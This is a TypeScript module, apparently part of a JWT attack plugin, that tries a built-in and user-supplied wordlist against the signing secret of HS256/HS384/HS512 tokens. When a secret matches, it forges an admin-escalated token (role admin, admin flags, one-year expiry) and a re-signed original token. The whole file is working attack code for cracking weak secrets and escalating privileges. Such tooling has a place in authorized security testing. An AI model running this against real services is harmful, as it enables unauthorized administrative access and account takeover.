/**
 * Weak HMAC Secret Brute-Force
 *
 * For HS256/HS384/HS512 tokens: try each word from the built-in wordlist
 * plus any user-supplied wordlist.  Returns one attack result per discovered
 * secret (re-signed with the same secret but elevated claims).
 */

import { signHMAC, verifyHMAC } from "../crypto/jwt.js";
import { WEAK_JWT_SECRETS } from "../wordlist.js";
import type { ParsedJWT, AttackResult, PluginConfig } from "../types.js";
import { nanoid } from "../util.js";

export async function buildWeakSecretAttacks(
  parsed: ParsedJWT,
  config: PluginConfig,
  originalToken: string
): Promise<AttackResult[]> {
  const alg = parsed.header.alg as string;
  if (!alg.startsWith("HS")) return [];

  const hmacAlg = alg as "HS256" | "HS384" | "HS512";
  const wordlist = [...WEAK_JWT_SECRETS, ...config.customWordlist];
  const results: AttackResult[] = [];

  for (const word of wordlist) {
    const secret = Buffer.from(word, "utf8");
    if (!verifyHMAC(originalToken, secret, hmacAlg)) continue;

    // Found a valid secret — build admin-escalated token
    const adminPayload = {
      ...parsed.payload,
      role: "admin",
      admin: true,
      is_admin: true,
      exp: Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 365,
    };
    const adminJwt = signHMAC(parsed.header, adminPayload, secret, hmacAlg);

    // Original token resigned (no claim changes) to prove key possession
    const resignedJwt = signHMAC(parsed.header, parsed.payload, secret, hmacAlg);

    results.push({
      id: nanoid(),
      technique: "weakSecret",
      techniqueName: `Weak Secret Found: "${word}"`,
      description:
        `Cracked the ${hmacAlg} signing secret: "${word}". ` +
        "Provides re-signed token with elevated claims (admin=true, role=admin, +1yr exp).",
      modifiedJWT: adminJwt,
      timestamp: Date.now(),
      hmacSecret: word,
    });

    results.push({
      id: nanoid(),
      technique: "weakSecret",
      techniqueName: `Weak Secret Re-sign (original claims): "${word}"`,
      description:
        `Re-signs the original token with secret "${word}" — no claim changes. ` +
        "Useful to verify the server accepts the cracked secret.",
      modifiedJWT: resignedJwt,
      timestamp: Date.now(),
      hmacSecret: word,
    });
  }

  return results;
}
